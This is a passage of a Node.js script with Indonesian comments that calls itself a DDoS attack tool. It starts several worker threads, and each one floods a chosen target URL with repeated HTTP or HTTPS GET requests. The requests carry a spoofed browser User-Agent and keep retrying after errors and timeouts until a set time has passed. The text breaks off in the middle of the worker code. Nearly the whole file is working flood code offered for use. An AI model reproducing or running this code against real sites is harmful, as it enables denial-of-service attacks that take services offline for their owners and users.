const { Worker } = require('worker_threads');
const os = require('os');
const path = require('path');

// Counter untuk melacak jumlah request
let totalRequests = 0;

/**
 * Fungsi untuk memulai serangan DDoS
 * @param {string} targetURL - URL target yang akan diserang
 * @param {number} duration - Durasi serangan dalam detik
 * @param {number} threads - Jumlah thread yang digunakan
 * @param {number} delayMs - Delay antara request dalam milidetik
 */
function startAttack(targetURL, duration, threads, delayMs) {
    console.log(`\n🚀 Memulai serangan ke: ${targetURL}`);
    console.log(`⏱ Durasi: ${duration} detik`);
    console.log(`🧵 Threads: ${threads}`);
    console.log(`⏳ Delay: ${delayMs}ms`);
    
    // Reset counter
    totalRequests = 0;
    
    // Buat worker thread untuk setiap thread yang diminta
    const workers = [];
    const startTime = Date.now();
    
    for (let i = 0; i < threads; i++) {
        const worker = new Worker(`
            const { parentPort, workerData } = require('worker_threads');
            const http = require('http');
            const https = require('https');
            const url = require('url');
            
            const targetURL = workerData.targetURL;
            const delayMs = workerData.delayMs;
            const duration = workerData.duration;
            const threadId = workerData.threadId;
            
            const parsedUrl = url.parse(targetURL);
            const protocol = parsedUrl.protocol === 'https:' ? https : http;
            const options = {
                hostname: parsedUrl.hostname,
                port: parsedUrl.port || (protocol === https ? 443 : 80),
                path: parsedUrl.path,
                method: 'GET',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
            };
            
            let requestCount = 0;
            const startTime = Date.now();
            
            function sendRequest() {
                const req = protocol.request(options, (res) => {
                    requestCount++;
                    // Kirim update ke main thread setiap 100 requests
                    if (requestCount % 100 === 0) {
                        parentPort.postMessage({ 
                            type: 'update', 
                            requests: requestCount,
                            threadId: threadId
                        });
                    }
                    
                    res.on('data', () => {});
                    res.on('end', () => {
                        setTimeout(sendRequest, delayMs);
                    });
                });
                
                req.on('error', (err) => {
                    setTimeout(sendRequest, delayMs);
                });
                
                req.setTimeout(5000, () => {
                    req.destroy();
                    setTimeout(sendRequest, delayMs);
                });
                
                req.end();
            }
            
            // Mulai mengirim request
            sendRequest();
            
            // Hentikan setelah durasi tertentu
            setTimeout(() => {
                parentPort.postMessage({ 
                    type: 'final', 
                    requests: requestCount,
                    threadId: threadId
                });
            }, duration